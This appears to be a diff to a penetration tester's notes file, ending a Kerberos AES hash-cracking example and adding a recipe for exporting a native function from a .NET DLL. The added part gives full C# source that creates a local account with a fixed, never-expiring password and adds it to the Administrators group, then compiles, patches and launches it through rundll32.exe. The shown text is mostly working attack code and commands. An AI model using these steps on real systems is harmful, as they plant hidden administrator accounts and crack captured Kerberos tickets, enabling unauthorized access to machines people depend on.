@@ -1970,3 +1970,96 @@ Execute the script like so:
 `krb-aes-crack.py 8562232c2dfc1458cc80d608deb7be53128c5a92ad8af724433e1f0daf259894 aes256 joeuser DOMAIN.TEST /my/wordlists/passwords.txt`
 
 The recovered password in this example is `Pa55w0rd`.
+
+## >> Exporting Native Functions from .NET Assemblies
+
+This example shows how to use mono and MS .NET utilities to create a .NET DLL and export a native C++ function so it can be used with rundll32.exe.  This scenario creates a local user in the Administrators group.
+
+**Install mono on your Linux host**
+
+```
+apt-get install mono-devel
+apt-get install mono-utils
+```
+
+**Create C# source file**
+
+This example is named `adduser.cs`.
+
+```csharp
+using System.Windows.Forms;
+using System;
+using System.DirectoryServices;
+namespace makeuser
+{
+   public class adduser
+   {
+      public static void doadduser()
+      {
+         try
+         {
+            DirectoryEntry AD = new DirectoryEntry("WinNT://" +
+            Environment.MachineName + ",computer");
+            DirectoryEntry NewUser = AD.Children.Add("TestUser", "user");
+            NewUser.Invoke("SetPassword", new object[] {"Te5t.Us3r.pw"});
+            NewUser.Invoke("Put", new object[] {"Description", "Test User"});
+            // set account active and pw never expires
+            int val = 0x10000 & ~0x2;
+            NewUser.Invoke("Put", new object[] {"UserFlags", val});
+            NewUser.CommitChanges();
+            DirectoryEntry grp;
+            grp = AD.Children.Find("Administrators", "group");
+            if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
+            MessageBox.Show("Account Created Successfully");
+         }
+         catch (Exception ex)
+         {
+            MessageBox.Show(ex.Message);
+         }
+      }
+   }
+   public class myclass
+   {
+      public static void createuser()
+      {
+         MessageBox.Show("Adding TestUser");
+         adduser.doadduser();
+      }
+   }
+}
+```
+
+**Compile the source on Linux**
+
+`mcs -t:library -r:System.Windows.Forms.dll -r:System.DirectoryServices -out:adduser.dll adduser.cs`
+
+**Create an IL file from the DLL**
+
+On Windows<br />
+`ildasm.exe /out:adduser.il adduser.dll`
+
+On Linux<br />
+`monodis adduser.dll --output=adduser.il`
+
+**Edit the adduser.il file**
+
+Insert the `.export [1]` directive.<br />
+```
+    .method public static hidebysig
+           default void createuser ()  cil managed
+    {
+        .export [1]
+        // Method begins at ...
+```
+
+**Compile the DLL from the IL file**
+
+On Windows<br />
+`ilasm.exe adduser.il /DLL /X64 /output=adduser2.dll`
+
+On Linux<br />
+`ilasm /dll /output:adduser2.dll adduser.il` (for reference only, the .export directive is ignored, so use Windows ilasm.exe)
+
+**Execute the createuser function**
+
+`rundll32.exe adduser2.dll,createuser`
